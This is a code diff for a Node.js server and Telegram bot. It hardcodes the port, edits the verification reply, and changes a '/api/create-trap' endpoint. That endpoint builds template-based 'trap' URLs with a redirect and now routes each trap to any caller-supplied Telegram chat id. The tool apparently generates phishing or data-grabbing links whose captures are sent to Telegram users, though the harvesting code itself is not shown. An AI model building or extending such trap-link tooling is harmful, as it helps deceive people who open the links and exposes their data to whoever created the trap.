@@ -70,7 +70,7 @@ process.on('SIGTERM', () => {
 });
 
 async function startServer() {
-  const PORT = Number(process.env.PORT) || 3000;
+  const PORT = 3000;
   console.log(`[STARTUP] ENV: ${process.env.NODE_ENV || 'development'}`);
   console.log(`[STARTUP] Target Port: ${PORT} (from env: ${process.env.PORT || 'not set'})`);
 
@@ -124,7 +124,11 @@ async function startServer() {
   app.get('/api/templates', (req, res) => { res.json(Object.entries(templates).map(([key, val]) => ({ id: key, name: val.name }))); });
   app.post('/api/create-trap', (req, res) => {
     const { tmplId, redirect } = req.body;
-    const id = generateTrapId(ADMIN_ID);
+    let chatId = ADMIN_ID;
+    if (req.body.chatId) {
+        chatId = req.body.chatId;
+    }
+    const id = generateTrapId(chatId);
     const trapUrl = `${appHost.replace(/\/$/, '')}/t/${tmplId}/${id}`;
     res.json({ success: true, url: trapUrl });
   });
@@ -1584,18 +1588,12 @@ There are no background services or permissions associated.
         agreementUsers.add(ctx.from.id);
         saveAgreement();
         ctx.answerCbQuery("System verified!").catch(() => {});
-        // ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
-        const safeName = (ctx.from?.first_name || 'User').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-        const startMsgText = getStartMsg(safeName);
-        
+        const safeName = (ctx.from.first_name || 'User').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        const txt = getStartMsg(safeName);
         try {
-            await ctx.replyWithPhoto('https://i.ibb.co.com/jP7f9D0X/a2f7c006764beac4fbdbd57b28dbb3da.jpg', {
-                caption: startMsgText,
-                parse_mode: 'HTML',
-                ...mainReplyKeyboard
-            });
-        } catch (e) {
-             ctx.reply(startMsgText, {parse_mode: 'HTML', ...mainReplyKeyboard});
+            await ctx.editMessageCaption(txt, { parse_mode: 'HTML', ...mainReplyKeyboard }).catch(() => ctx.reply(txt, { parse_mode: 'HTML', ...mainReplyKeyboard }));
+        } catch(e) {
+            ctx.reply(txt, { parse_mode: 'HTML', ...mainReplyKeyboard }).catch(()=>{});
         }
     });
 
